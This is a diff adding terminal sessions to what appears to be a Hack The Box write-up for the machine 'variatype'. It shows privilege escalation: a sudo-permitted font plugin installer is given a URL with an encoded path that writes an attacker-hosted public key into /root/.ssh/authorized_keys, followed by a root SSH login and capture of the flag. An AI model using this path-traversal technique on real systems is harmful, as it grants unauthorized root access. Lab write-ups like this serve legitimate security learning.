@@ -588,4 +588,62 @@ The dangerous part sits in one line:
 downloaded_path = index.download(plugin_url, PLUGIN_DIR)
 ```
 
+```
+steve@variatype:~$ ssh-keygen -t ed25519 -f /tmp/root_key -N ""
+Generating public/private ed25519 key pair.
+/tmp/root_key already exists.
+Overwrite (y/n)? y
+Your identification has been saved in /tmp/root_key
+Your public key has been saved in /tmp/root_key.pub
+The key fingerprint is:
+SHA256:vbHLomF/ggJWrH3vQ8wtnML499qy2UKj6mo4Armc7WI steve@variatype
+The key's randomart image is:
++--[ED25519 256]--+
+|                 |
+|                 |
+|   .             |
+|    o    .       |
+| . + o +Soo      |
+|o + o + X .+     |
+|o+o. ooB oo      |
+|=E....+oO=..     |
+|oo++oo.+*@*      |
++----[SHA256]-----+
+steve@variatype:~$ cat /tmp/root_key.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9oFDMKP/Gq4CiBR6yngZbeLEZHuAdEqG5tKij80Ztq steve@variatype
+steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+  "http://10.10.15.156:80/%2Froot%2F.ssh%2Fauthorized_keys"
+2026-03-15 06:33:27,108 [INFO] Attempting to install plugin from: http://10.10.15.156:80/%2Froot%2F.ssh%2Fauthorized_keys
+2026-03-15 06:33:27,118 [INFO] Downloading http://10.10.15.156:80/%2Froot%2F.ssh%2Fauthorized_keys
+2026-03-15 06:33:27,458 [INFO] Plugin installed at: /root/.ssh/authorized_keys
+[+] Plugin installed successfully.
+steve@variatype:~$ cat /tmp/root_key
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBvaBQzCj/xquAogUesp4GW3ixGR7gHRKhubSoo/NGbagAAAJhBA8bJQQPG
+yQAAAAtzc2gtZWQyNTUxOQAAACBvaBQzCj/xquAogUesp4GW3ixGR7gHRKhubSoo/NGbag
+AAAEAKM2txJBZhFZLUOXUonqSDN5ar4tdp+ds88w9PncmF329oFDMKP/Gq4CiBR6yngZbe
+LEZHuAdEqG5tKij80ZtqAAAAD3N0ZXZlQHZhcmlhdHlwZQECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+```
+ajdev@rootbox:~/HTB$ nano root_key
+ajdev@rootbox:~/HTB$ chmod 600 ~/HTB/root_key
+ajdev@rootbox:~/HTB$ ssh -i ~/HTB/root_key root@10.129.8.177
+Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Mar 15 06:36:55 2026 from 10.10.15.156
+root@variatype:~# ls
+root.txt
+root@variatype:~# cat root.txt
+0a622b52a58766beac5e8dc513ca0a3f
+root@variatype:~#
+```
 
